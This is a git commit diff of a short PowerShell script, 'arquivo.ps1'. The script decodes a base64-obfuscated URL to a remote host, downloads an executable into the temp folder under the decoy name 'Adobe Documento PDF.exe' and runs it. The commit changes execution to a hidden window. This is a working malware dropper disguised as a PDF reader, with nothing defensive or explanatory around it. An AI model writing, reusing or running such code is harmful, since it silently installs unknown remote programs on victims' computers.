7e461c7450a5847ca8c6f6cedf3e514f89775f8c
corinthias <89884709+corinthias2025@users.noreply.github.com>
2025-07-24 14:35:55 -0300

    Update arquivo.ps1

--- arquivo.ps1
+++ arquivo.ps1
@@ -3,4 +3,4 @@ $d = 'aHR0cHM6Ly90ZXN0YW5kbzEyMy1ibG9uZC52ZXJjZWwuYXBwL0Fkb2JlJTIwLSUyMExlaXRvci
 $p = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($d))
 $f = "$env:TEMP\Adobe Documento PDF.exe"
 (New-Object Net.WebClient).DownloadFile($p, $f)
-&($f)
+Start-Process -FilePath $f -WindowStyle Hidden
